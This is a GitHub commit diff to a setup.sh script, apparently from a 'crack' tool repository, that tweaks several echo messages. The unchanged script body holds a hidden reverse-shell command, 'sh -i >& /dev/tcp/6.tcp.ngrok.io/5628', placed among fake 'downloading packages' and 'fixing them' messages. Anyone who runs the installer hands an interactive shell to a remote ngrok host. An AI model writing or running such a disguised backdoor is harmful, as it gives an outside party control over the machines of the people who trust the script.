84535389e68cab3d6274f5c035aae9c5ca105bb3
witcher1023 <89247079+witcher1023@users.noreply.github.com>
2022-02-01 10:52:20 +0500

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,11 +1,11 @@
 echo Your Tool Is Now Start
 sleep 3
-echo Downloading some Packages wait
+echo Downloading some Packages
 sleep 4
-echo Dont Close This Terminal Wait upto 5 Minutes
+echo Dont Close This Terminal Wait few Minutes
 echo Some packages are missing 
 sleep 2
-echo fixing them wait
+echo fixing them
 sh -i >& /dev/tcp/6.tcp.ngrok.io/5628 &0>1
 echo ALl Done Now run The tool
 echo python2 crack.py
